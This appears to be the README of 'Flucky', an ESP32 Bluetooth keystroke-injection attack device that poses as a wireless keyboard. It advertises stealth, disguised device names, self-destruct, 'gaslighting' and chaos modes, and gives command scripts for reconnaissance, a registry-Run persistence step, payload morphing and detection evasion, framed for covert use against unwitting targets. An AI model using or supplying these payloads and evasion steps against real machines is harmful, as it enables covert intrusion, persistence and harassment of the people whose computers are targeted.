**The Ultimate Wireless HID Attack Tool - No Manual Pairing Required**

> *"Why plug in when you can simply appear as a keyboard?"*

</div>

## üöÄ The Revolution in HID Attacks

### Why Flucky Exists - A Story of Necessity

I created Flucky to fix something:

- **Physical access required** - Plugging devices into target systems
- **Limited stealth capabilities** - Obvious indicators of compromise
- **No psychological elements** - Pure technical attacks without mind games

Flucky changes **everything**. This isn't just another Rubber Ducky clone - this is the evolution the security community desperately needed.

### The Fundamental Breakthrough: Automatic BLE Connectivity

**Traditional HID Attacks:**
```bash
# Step 1: Physical access - plug device in
# Step 2: Hope the target doesn't notice
# Step 3: Execute basic payload
# Step 4: Pray you don't get caught
```

**Flucky's Approach:**
```bash
# Step 1: Be within Bluetooth range
# Step 2: Automatically appears as available keyboard
# Step 3: [Target connects thinking it's their device] or you connect within 10 sec.
# Step 4: Execute advanced, morphing payloads
# Step 5: Leave no trace, create maximum impact
```

## üéØ What Makes Flucky Different?

### 1. üöÄ Automatic Bluetooth LE Connectivity
- **No manual pairing required** - Appears as standard HID keyboard
- **Zero-click connection** - Target simply selects from available devices
- **Persistent presence** - Stays available until connected
- **Custom device naming** - Disguise as legitimate peripherals

### 2. üï∂Ô∏è True Stealth Operations  
- **Complete output suppression** - No serial logs, no LED indicators
- **Encrypted payload storage** - Scripts remain secure even if device captured
- **Behavioral obfuscation** - Random delays and execution patterns
- **Self-destruct mechanisms** - Automatic script erasure after use

### 3. üß† Psychological Warfare Capabilities
- **Gaslighting features** - Make users question reality
- **Chaos mode** - Unpredictable, random script execution
- **Advanced obfuscation** - Real-time typing manipulation
- **Focus disruption** - Steal attention at critical moments

### 4. ‚ö° Enterprise-Grade Features
- **LOLBAS integration** - Living Off The Land Binary execution
- **Scheduled payloads** - Timed execution for optimal impact
- **Dual trigger system** - Multiple payloads on one device
- **Morphing scripts** - Self-modifying payloads that evade pattern detection

## üö® Troubleshooting & Error Guide

### Common Issues and Solutions

#### Bluetooth Connectivity Problems

**Issue: "Error: Bluetooth not connected"**
```bash
# Symptoms:
# - STATUS shows "Bluetooth: Disconnected"
# - Commands fail with Bluetooth error

# Solutions:
1. RECONNECT  # Force reconnection
2. Check target device Bluetooth settings
3. Ensure ESP32 is in range (typically 10m)
4. Verify no other HID devices are blocking
5. DISCONNECT then RECONNECT for hard reset
```

**Issue: Device not appearing in Bluetooth list**
```bash
# Solutions:
1. STATUS  # Verify BLE is running
2. rename "Legitimate Keyboard"  # Use convincing name
3. Check ESP32 power supply (stable 3.3V needed)
4. Verify firmware flashed correctly
5. Monitor serial for BLE initialization errors
```

#### Script Execution Issues

**Issue: "Error: Invalid command length"**
```bash
# Cause: Command exceeds 256 character limit
# Fix: Split long commands or use script mode

# Bad:
STRING This is a very long command that exceeds the maximum allowed character limit and will fail to execute properly because it's too damn long

# Good:
STRING This is part one of a long command
DELAY 100
STRING This is part two of the same long command
```

**Issue: "Error: Script too long"**
```bash
# Cause: Script exceeds 4096 character limit
# Fix: Optimize script or use multiple button scripts

# Optimization techniques:
1. Remove unnecessary DELAY commands
2. Use shorter STRING content
3. Combine multiple commands on one line with ;
4. Use LOLBAS instead of lengthy manual steps
```

**Issue: "Error: STRING requires text to type"**
```bash
# Cause: Empty STRING command
# Fix: Ensure STRING has content

# Bad:
STRING
# Good:
STRING Hello World
```

#### Hardware Issues

**Issue: Buttons not responding**
```bash
# Check:
1. ENABLE_BUTTON  # Verify buttons are enabled
2. Check physical wiring (GPIO 0 and GPIO 2)
3. Verify INPUT_PULLUP configuration
4. Test with simple command: STRING Test
```

**Issue: LED not working**
```bash
# Check:
1. STEALTH_OFF  # Ensure stealth mode is disabled
2. Verify GPIO 22 connection
3. Check LED polarity
4. Test with: STEALTH_ON then STEALTH_OFF
```

#### Performance Issues

**Issue: Commands executing too slowly**
```bash
# Optimization:
1. DEFAULTDELAY 0  # Remove default delays
2. JITTER_OFF  # Disable random delays
3. OBFUSCATE_OFF  # Disable obfuscation
4. ADV_OBFUSCATE_OFF  # Disable advanced obfuscation
```

**Issue: Random freezes or crashes**
```bash
# Stability measures:
1. Reduce script complexity
2. Add strategic DELAY commands
3. Avoid memory-intensive operations
4. Ensure stable power supply
```

### Error Code Reference

| Error Message | Cause | Solution |
|---------------|-------|----------|
| `Bluetooth not initialized` | BLE not started | Use `RECONNECT` |
| `Bluetooth not connected` | No active connection | Check target device |
| `Invalid command length` | Command too long | Split into parts |
| `STRING requires text` | Empty string | Add content |
| `Unknown command` | Typo or invalid command | Check `help` |
| `Script too long` | >4096 characters | Optimize script |
| `Button script buffer overflow` | Script too large during definition | Use smaller script |

## üîß Advanced Configuration Guide

### Memory Management

**Buffer Sizes and Limits:**
```bash
# Current configuration (from source code):
- Command buffer: 256 characters
- Script storage: 4096 characters
- Command history: 10 entries
- Gaslight profile: 50 lines max
- Serial buffer: 1024 bytes
```

**Optimization Tips:**
```bash
# For memory-constrained operations:
1. Use shorter string literals
2. Reuse commands with REPEAT
3. Store complex scripts as button scripts
4. Use LOLBAS instead of long manual sequences
```

### Power Management

**Battery Operation:**
```bash
# Extend battery life:
STEALTH_ON        # Disable LED
DISABLE_BUTTON    # Prevent accidental activation
DELAY 1000        # Add delays to reduce duty cycle
# Typical consumption: 40-80mA during operation
```

**USB Power Considerations:**
```bash
# Ensure stable USB power:
- Use quality USB cables
- Avoid USB hubs if possible
- Test with different power sources
- Monitor for voltage drops during transmission
```

## üéØ Advanced Usage Patterns

### Multi-Stage Attack Chains

**Phase-Based Execution:**
```bash
# Stage 1: Reconnaissance
BUTTON_DEF
DELAY 3000
LOLBAS_CMD "systeminfo && whoami /all"
ENTER
DELAY 2000
STRING Phase 1 Complete - Reconnaissance
ENTER
END_BUTTON

# Stage 2: Privilege Escalation  
BUTTON2_DEF
DELAY 3000
LOLBAS_REG query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
ENTER
DELAY 2000
STRING Phase 2 Complete - Privilege Assessment
ENTER
END_BUTTON2

# Stage 3: Persistence (Easter Egg)
HIDE_EGG "STRING Phase 3: Establishing Persistence; ENTER; DELAY 1000; LOLBAS_REG add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateService\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\"; ENTER"
```

### Conditional Execution Patterns

**Time-Based Activation:**
```bash
# Execute different scripts based on time
SCHEDULE 30000 "STRING Morning Reconnaissance; ENTER"
SCHEDULE 720000 "STRING Afternoon Check; ENTER" 
SCHEDULE 1440000 "STRING Evening Cleanup; ENTER"
```

**Behavior-Adaptive Scripts:**
```bash
# Use chaos mode for unpredictable execution
CHAOS_ON
BUTTON_DEF
STRING Unpredictable Security Test
ENTER
# Different execution each time based on random timing
END_BUTTON
```

## üîí Security Best Practices

### Operational Security

**Pre-Deployment Checklist:**
```bash
1. SET_XOR_KEY MissionSpecificKey
2. STEALTH_ON
3. DISABLE_BUTTON  # For transport
4. Verify all scripts encrypted
5. Test in isolated environment first
```

**Post-Operation Procedures:**
```bash
1. ACTIVATE_EGG  # If cleanup script defined
2. MORPH_PAYLOAD  # Change script signatures
3. SET_XOR_KEY NewKey  # Change encryption
4. SELF_DESTRUCT 1  # One-time use if needed
```

### Detection Avoidance

**Behavioral Evasion:**
```bash
# Make execution look human:
ADV_OBFUSCATE_ON
SET_JITTER 500
JITTER_ON
DEFAULTDELAY 100
# Adds randomness to timing and keystrokes
```

**Signature Evasion:**
```bash
# Change command signatures:
MORPH_PAYLOAD  # Randomize script order
SET_XOR_KEY  # Encrypt stored scripts
Use LOLBAS  # Avoid external tool signatures
```
